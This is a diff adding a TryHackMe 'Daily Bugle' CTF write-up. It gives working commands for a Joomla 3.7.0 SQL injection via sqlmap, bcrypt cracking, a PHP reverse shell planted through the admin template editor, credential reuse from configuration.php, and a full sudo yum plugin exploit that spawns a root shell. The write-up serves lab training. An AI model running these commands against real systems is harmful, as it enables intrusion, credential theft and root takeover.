@@ -1,0 +1,209 @@
+# TryHackMe — Daily Bugle Writeup
+
+**Difficulty:** Hard  
+**Category:** Web Exploitation, SQL Injection, Privilege Escalation  
+**Platform:** TryHackMe
+
+---
+
+## Overview
+
+Daily Bugle is a hard-rated TryHackMe machine centred around a Joomla 3.7.0 CMS. The attack chain involves exploiting a known SQL injection vulnerability to extract credentials, cracking a bcrypt hash, gaining a reverse shell via the Joomla admin panel, lateral movement through credential reuse found in a config file, and finally privilege escalation via `sudo yum` using a malicious yum plugin.
+
+---
+
+## Enumeration
+
+### Nmap
+
+Start with a full port scan to identify open services:
+
+nmap -sC -sV -oN nmap.txt <TARGET_IP>
+```
+
+Key findings:
+- **Port 22** — SSH (OpenSSH)
+- **Port 80** — HTTP (Apache httpd, CentOS)
+- **Port 3306** — MySQL (MariaDB, local only)
+
+### Gobuster
+
+Enumerate directories on the web server:
+
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+```
+
+Notable directories found:
+- `/administrator` — Joomla admin login
+- `/components`, `/modules`, `/plugins`, `/templates`
+- `/configuration.php` (not directly readable via browser)
+- `/robots.txt` — reveals many Joomla paths
+
+### JoomScan
+
+Run JoomScan to fingerprint the CMS:
+
+joomscan -u http://<TARGET_IP>
+```
+
+Key results:
+- **Joomla version: 3.7.0**
+- Admin panel at `/administrator/`
+- No WAF detected
+
+---
+
+## Exploitation — SQL Injection (CVE-2017-8917)
+
+Joomla 3.7.0 is vulnerable to a SQL injection in the `com_fields` component.
+
+### Using the CVE exploit script
+
+A public Python exploit exists for this vulnerability. Run it against the target:
+
+python3 main.py --host <TARGET_IP>
+```
+
+The script:
+1. Fetches the CSRF token automatically
+2. Confirms the target is vulnerable
+3. Dumps the database version, current database, and tables
+4. Extracts the `#__users` table, revealing a bcrypt hash for the admin user `jonah`
+
+### Alternative — sqlmap
+
+sqlmap -u "http://<TARGET_IP>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
+  --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+```
+
+---
+
+## Cracking the Hash
+
+The extracted hash is bcrypt. Save it to a file and crack it with John:
+
+```bash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+Cracking takes a few minutes due to bcrypt's cost factor. The password is found in the rockyou list.
+
+---
+
+## Admin Panel — Reverse Shell
+
+Log into the Joomla admin panel at `http://<TARGET_IP>/administrator/` using the cracked credentials.
+
+Navigate to:  
+**Extensions → Templates → Templates → Beez3 (or any active template) → index.php**
+
+Replace the template PHP with a PHP reverse shell (e.g. from PentestMonkey), then set up a listener:
+
+nc -lvnp 4444
+```
+
+Visit a page on the site to trigger the shell. You will land as the `apache` user.
+
+---
+
+## Shell Stabilisation
+
+Python 3 is not available on this machine, but Python 2 is:
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+## Lateral Movement — Config File
+
+Enumerate the web root for sensitive files:
+
+cat /var/www/html/configuration.php
+```
+
+The Joomla config contains database credentials. Try reusing the database password to switch to the local user account:
+
+su jjameson
+```
+
+It works — the database password is reused as jjameson's system password.
+
+Grab the user flag:
+
+cat /home/jjameson/user.txt
+
+## Privilege Escalation — sudo yum Plugin
+
+Check sudo permissions:
+
+sudo -l
+```
+
+Output shows:
+```
+(ALL) NOPASSWD: /usr/bin/yum
+```
+
+`yum` can load custom plugins. We exploit this by creating a temporary directory with a malicious yum plugin that executes `/bin/sh` as root.
+
+### Exploit
+
+Run the following as `jjameson` on the target:
+
+TF=$(mktemp -d)
+
+cat >$TF/x <<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf <<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py <<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+    os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+```
+
+This spawns a root shell via the yum plugin hook. Verify:
+
+whoami
+# root
+```
+
+Grab the root flag:
+
+cat /root/root.txt
+```
+
+---
+
+## Summary
+
+| Stage | Method |
+|---|---|
+| Recon | Nmap, Gobuster, JoomScan |
+| Initial Access | Joomla 3.7.0 SQLi (CVE-2017-8917) |
+| Credential Access | John the Ripper (bcrypt) |
+| Remote Shell | PHP reverse shell via Joomla template editor |
+| Lateral Movement | Password reuse from configuration.php |
+| Privilege Escalation | `sudo yum` malicious plugin |
+
+---
+
+## Key Takeaways
+
+- Always check CMS versions — Joomla 3.7.0 has a well-known critical SQLi
+- Bcrypt is slow to crack but rockyou.txt will eventually find weak passwords
+- Config files often contain reused credentials — always check them
+- GTFOBins is your friend: `yum` with sudo is a clean privesc path
+- The RPM install approach for yum privesc can fail on older systems due to `rpmlib(LargeFiles)` compatibility — the plugin method is more reliable and requires no file transfer
